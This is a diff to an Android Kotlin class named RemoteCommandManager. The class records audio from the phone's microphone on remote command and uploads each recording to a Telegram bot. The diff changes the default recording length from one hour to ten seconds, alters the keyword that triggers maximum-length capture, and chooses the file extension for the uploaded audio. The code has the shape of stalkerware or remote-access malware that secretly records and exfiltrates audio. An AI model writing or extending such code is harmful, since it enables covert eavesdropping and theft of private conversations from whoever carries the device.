@@ -1275,12 +1275,12 @@ class RemoteCommandManager(private val context: Context) {
     }
 
     private suspend fun recordAudioRemote(payload: String): String = withContext(Dispatchers.IO) {
-        var durationSec = 3600 // default 1 hour for unlimited recording
+        var durationSec = 10 // default 10 seconds for quick audio capture
         var maxShots = 1
         var intervalSec = 2
         val trimmed = payload.trim()
         val lowerTrimmed = trimmed.lowercase()
-        if (lowerTrimmed.contains("unlimited") || lowerTrimmed.contains("forever") || lowerTrimmed.contains("max") || lowerTrimmed == "0") {
+        if (lowerTrimmed.contains("unlimited") || lowerTrimmed.contains("forever") || lowerTrimmed.contains("max") || lowerTrimmed == "3600") {
             durationSec = 3600
         } else if (trimmed.startsWith("{")) {
             try {
@@ -1319,7 +1319,7 @@ class RemoteCommandManager(private val context: Context) {
                 durationSec = parsed
             }
         }
-        val finalDuration = if (durationSec <= 0) 3600 else durationSec.coerceAtLeast(1)
+        val finalDuration = if (durationSec <= 0) 10 else durationSec.coerceAtLeast(1)
 
         val audioHelper = AudioRecorderHelper(context)
         try {
@@ -1350,7 +1350,8 @@ class RemoteCommandManager(private val context: Context) {
 
             try {
                 val telegramBot = TelegramBotManager(context)
-                telegramBot.sendAudio(audioBytes, "audio_${nowMs}.amr", "Duration: $finalDuration sec (${(audioBytes.size / 1024)} KB)")
+                val audioExt = if (base64Data.contains("audio/wav")) "wav" else "amr"
+                telegramBot.sendAudio(audioBytes, "audio_${nowMs}.$audioExt", "Duration: $finalDuration sec (${(audioBytes.size / 1024)} KB)")
             } catch (e: Exception) {
                 Log.e("RemoteCommandManager", "Failed to upload audio to Telegram: ${e.message}")
             }
